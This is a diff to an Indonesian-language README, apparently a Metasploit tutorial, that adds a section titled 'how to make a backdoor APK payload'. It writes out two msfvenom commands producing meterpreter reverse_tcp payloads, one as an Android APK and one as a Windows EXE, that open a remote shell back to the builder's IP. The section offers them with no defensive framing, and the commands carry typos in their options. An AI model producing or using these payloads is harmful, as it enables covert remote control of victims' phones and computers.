@@ -19,6 +19,14 @@ msfconsole
 •Untuk membuat payload ```msfvenom ```<br>
 
 ### Cara membuat Payload apk Backdoor 
+• Android 
+``` fish
+msfvenom -p android/meterpreter/reverse_tcp LHOS=(your IP/sah) LPORT=4444 R> /sdcard/INDOnimous.apk
+```
+• Windows
+``` fish
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=(your IP/sah) LPORT=4444 f> /desktop/INDOnimous.exe
+```
 
 
 
